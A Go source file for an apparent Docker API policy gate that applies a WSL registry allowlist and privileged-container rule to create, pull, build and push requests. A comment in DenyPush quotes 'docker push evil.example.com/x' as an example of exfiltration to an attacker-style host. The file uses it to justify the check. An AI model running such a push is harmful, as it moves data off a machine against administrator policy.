package wslc

import (
	"fmt"
	"strings"

	"github.com/wslkit/skrog/internal/apibody"
	"github.com/wslkit/skrog/internal/imageref"
	"github.com/wslkit/skrog/internal/pipeproxy"
)

// PolicyGate enforces the administrator's WSL container policy at Skrog's pipe,
// standing in for the checks that live in wslcsession and that a direct
// docker.sock relay bypasses (#322).
//
// It implements pipeproxy.Gate and pipeproxy.ImageGate. The rules are WSL's,
// read from WSL's own configuration — the aim is that a deployed allowlist
// means the same thing through this pipe as through `wslc`, not that Skrog
// invents a second policy language next to it. Skrog's own policy.yaml is a
// separate, additional gate; this one exists so an Intune deployment is not
// silently voided by installing Skrog.
type PolicyGate struct {
	// Policies is the policy to enforce when Source is nil. Tests set it
	// directly; production wires Source instead.
	Policies Policies

	// Source returns the policy to enforce for THIS request, re-reading it if
	// it has changed on disk.
	//
	// It exists because a fixed snapshot is wrong here: the supervisor runs for
	// months, so a policy deployed or tightened after it started would never be
	// enforced (#354). Every judgement below goes through policies() rather
	// than touching the field, so there is one place this can be got wrong.
	Source func() Policies
}

// policies is the policy in force for the request being judged.
func (g *PolicyGate) policies() Policies {
	if g.Source != nil {
		return g.Source()
	}
	return g.Policies
}

// DenyCreate judges `docker create` / `docker run`.
//
// Two checks: the image's registry against the allowlist, and --privileged
// against AllowWSLContainerPrivileged.
func (g *PolicyGate) DenyCreate(body map[string]any) (string, bool) {
	// Read once for the whole judgement: both checks below must apply the same
	// policy, and re-reading between them could straddle a GPO refresh.
	p := g.policies()

	if image := apibody.String(body, "Image"); image != "" {
		server, ok := imageref.Registry(image)
		if !ok {
			// Unparseable. Refuse while an allowlist is active rather than
			// guessing a registry for it: dockerd rejects this reference too,
			// so nothing legitimate is lost, and guessing is how a gate permits
			// something the daemon then resolves elsewhere. Same precedent as
			// DenyBuild — cannot attribute, so refuse.
			if p.HasRegistryAllowlist() {
				return fmt.Sprintf(
					"image reference %q cannot be attributed to a registry, and "+
						"WSLContainerRegistryAllowlist is in force on this machine", image), true
			}
		} else if !p.RegistryAllowed(server) {
			return fmt.Sprintf(
				"WSLContainerRegistryAllowlist does not permit registry %q (image %q); "+
					"this machine's WSL policy allows: %s",
				server, image, strings.Join(p.RegistryAllowlist, ", ")), true
		}
	}

	if !p.PrivilegedAllowed {
		if hc, ok := apibody.Map(body, "HostConfig"); ok {
			if priv, _ := apibody.Field(hc, "Privileged"); truthyPriv(priv) {
				return "AllowWSLContainerPrivileged denies privileged containers on this machine", true
			}
		}
	}
	return "", false
}

// DenyPull judges `docker pull`, and the implicit pull inside `docker run`.
//
// This is the check that makes the allowlist mean what an administrator thinks
// it means. Gating only container creation would stop a blocked image running
// while still fetching it onto the machine, which is not the guarantee WSL
// gives: it applies the allowlist when wslcsession handles the pull, before the
// bytes are requested.
func (g *PolicyGate) DenyPull(image string) (string, bool) {
	p := g.policies()
	server, ok := imageref.Registry(image)
	if !ok {
		if p.HasRegistryAllowlist() {
			return fmt.Sprintf(
				"image reference %q cannot be attributed to a registry, and "+
					"WSLContainerRegistryAllowlist is in force on this machine", image), true
		}
		return "", false
	}
	if p.RegistryAllowed(server) {
		return "", false
	}
	return fmt.Sprintf(
		"WSLContainerRegistryAllowlist does not permit pulling from %q (image %q); "+
			"this machine's WSL policy allows: %s",
		server, image, strings.Join(p.RegistryAllowlist, ", ")), true
}

// DenyBuild judges `docker build`.
//
// Refused outright whenever an allowlist is active: a Dockerfile's FROM and any
// RUN can reach any registry, and at the pipe a BuildKit build is an opaque
// gRPC stream, so the traffic cannot be attributed to an allowed registry.
// Allowing builds through would be the easiest possible way around the
// allowlist, so this fails closed.
//
// wslpolicies.h anticipates exactly this, for callers "that cannot attribute
// traffic to a specific registry and must therefore refuse the operation
// whenever any allowlist restriction is active", naming `wslc image build` as
// the example.
//
// The shipped CLI is better than its own header, though, and it is worth being
// straight about the difference: `wslc image build` is NOT refused. It runs,
// and the allowlist is enforced per source inside BuildKit — a blocked base
// image fails with `source "docker-image://docker.io/library/busybox:latest"
// denied by policy`. wslcsession can do that because it drives BuildKit
// directly and attaches a source policy to the solve request. That policy is
// client-side, not daemon configuration: a build sent straight to this
// session's dockerd inherits nothing, which is measured, not assumed.
//
// Matching it would mean parsing and rewriting protobuf inside a hijacked HTTP/2
// stream. Until that exists, Skrog is stricter than WSL here rather than
// looser, and says so in the refusal.
func (g *PolicyGate) DenyBuild() (string, bool) {
	if !g.policies().HasRegistryAllowlist() {
		return "", false
	}
	return "WSLContainerRegistryAllowlist is in force on this machine, and a build " +
		"can pull from any registry, so it cannot be attributed to an allowed one. " +
		"Skrog refuses the build; `wslc image build` instead enforces the allowlist " +
		"per source inside BuildKit, which Skrog cannot do at the pipe", true
}

// DenyPush judges `docker push` and `docker plugin push`.
//
// A registry allowlist gating only inbound traffic controls what may enter the
// machine and says nothing about what leaves it — and leaving is the direction
// that moves data off it. Before this, with an allowlist deployed:
//
//	docker pull evil.example.com/x    refused
//	docker push evil.example.com/x    allowed
//
// Two readings of "registry allowlist" were available. The supply-chain
// reading says it controls what code may ENTER, so push is out of scope. The
// data-exfiltration reading says it governs which registries this machine
// speaks to at all. WSL settles it: `wslc push` refuses a blocked registry, so
// gating here matches them rather than Skrog inventing a second answer — the
// rule this whole gate has followed since #322.
//
// Worth being straight about the limit, which is the same one #343 documents:
// this is admission control at the Docker API, not a network control. A
// container can reach any registry it likes regardless. Gating push raises the
// bar for an accident, not for a determined local user.
func (g *PolicyGate) DenyPush(image string) (string, bool) {
	p := g.policies()
	server, ok := imageref.Registry(image)
	if !ok {
		if p.HasRegistryAllowlist() {
			return fmt.Sprintf(
				"image reference %q cannot be attributed to a registry, and "+
					"WSLContainerRegistryAllowlist is in force on this machine", image), true
		}
		return "", false
	}
	if p.RegistryAllowed(server) {
		return "", false
	}
	return fmt.Sprintf(
		"WSLContainerRegistryAllowlist does not permit pushing to %q (image %q); "+
			"this machine's WSL policy allows: %s",
		server, image, strings.Join(p.RegistryAllowlist, ", ")), true
}

// The handler reaches ImageGate through a type assertion, so a gate one method
// short silently stops being judged instead of failing to build. These turn
// that into a compile error.
var (
	_ pipeproxy.Gate      = (*PolicyGate)(nil)
	_ pipeproxy.ImageGate = (*PolicyGate)(nil)
)

// truthyPriv accepts the shapes a JSON decode can produce for a boolean the
// daemon will read as true. A bare type assertion to bool missed `"Privileged":
// 1`, which dockerd's decoder rejects outright -- but it also missed nothing
// else, so this stays deliberately narrow rather than inventing coercions the
// engine does not perform.
func truthyPriv(v any) bool {
	b, _ := v.(bool)
	return b
}
